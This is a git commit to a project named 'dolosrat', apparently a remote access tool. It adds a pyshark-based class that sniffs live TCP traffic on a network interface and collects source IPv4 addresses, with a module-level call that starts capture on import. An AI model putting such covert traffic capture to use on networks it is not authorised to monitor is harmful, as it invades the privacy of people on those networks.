9937ea8cccbafce3769ec83a4cc86689fd159065
Ryan Instrell <ryaninstrell@hotmail.co.uk>
2023-06-18 21:17:28 +0100

    Implement IPv4 sniffing functionality.

--- dolosrat/commands/network.py
+++ dolosrat/commands/network.py
@@ -10,15 +10,16 @@
 """
 
 # Built-in/Generic Imports.
-from typing import List, Optional, Union
+from typing import Set, Optional, Union
 from ipaddress import IPv4Address
 
 # Modules.
 from utils.network import Ifa
-# from utils.parser import ipv4_list_to_ipv4
+from utils.validator import validate_ipv4_addr
 
 # External Imports.
 from pyshark import LiveCapture
+from pyshark.packet.packet import Packet
 
 class IPv4Capture:
     """_summary_
@@ -27,7 +28,8 @@ class IPv4Capture:
     def __init__(
         self: object,
         ifa: Ifa,
-        timeout: Optional[int] = 50
+        timeout: Optional[int] = 15,
+        capture_filter: Optional[str] = 'ip and tcp'
     ) -> None:
         """_summary_
 
@@ -42,12 +44,18 @@ class IPv4Capture:
         # PyShark method.
         self._timeout = timeout
 
+        # Filter to reduce capture overhead.
+        self._filter = capture_filter
+
         # Handle to LiveCapture.
         self._capture: Union[None, LiveCapture] = None
 
         # List comprising the extracted, and parsed,
         # IPv4 addresses.
-        self._ipv4_addrs: List[Union[str, IPv4Address]] = []
+        self._ipv4_addrs: Set[Union[str, IPv4Address]] = set()
+
+        # Create LiveCapture handler.
+        self._init_handler()
 
     def __del__(self: object) -> None:
         """_summary_
@@ -55,10 +63,72 @@ class IPv4Capture:
         Args:
             self (object): _description_
         """
+        # Releases handle to LiveCapture.
         self._capture = None
         del self
 
-    def _init_handler(self: object) -> None: ...
-    
+    def _init_handler(self: object) -> None:
+        """_summary_
+
+        Args:
+            self (object): _description_
+        """
+        # Checks if 'Ifa' is set; otherwise
+        # ifa_name cannot be read.
+        if self._ifa:
+            # Creates LiveCapture instance.
+            self._capture = LiveCapture(
+                # Interface name.
+                interface=self._ifa.ifa_name,
+                # Filter to reduce processing
+                # overhead of unneccessary frames.
+                # i.e., UDP (for now), etc.
+                bpf_filter=self._filter
+            )
+
+        self._sniff_packets() # Remove after.
+
+    def _extract_ipv4_addr(self: object, packet: Packet) -> None:
+        """_summary_
+
+        Args:
+            self (object): _description_
+        """
+        # As IPv4Address is hashable, this 
+        # can be added to a set to ensure that
+        # no hashes match.
+        self._ipv4_addrs.add(
+            # Converts src IPv4 address (str) 
+            # to hashable IPv4Address.
+            validate_ipv4_addr(packet.ip.src)
+        )
+
+    def _sniff_packets(self: object) -> None:
+        """_summary_
+
+        Args:
+            self (object): _description_
+        """
+        try:
+            # Sniff, and apply callback to 
+            # extract IPv4 addresses from packets.
+            self._capture.apply_on_packets(
+                self._extract_ipv4_addr,
+                timeout=self._timeout
+            )
+        # Raised by PyShark - therefore
+        # caught and ignored.
+        except TimeoutError:
+            pass
+
     def capture(self: object) -> None:
-        ...
+        """_summary_
+
+        Args:
+            self (object): _description_
+        """
+        # Initialises capturing of packets
+        # on selected interface.
+        self._sniff_packets()
+        
+IPv4Capture(Ifa('Wi-Fi', '192.168.1.1'))._init_handler()
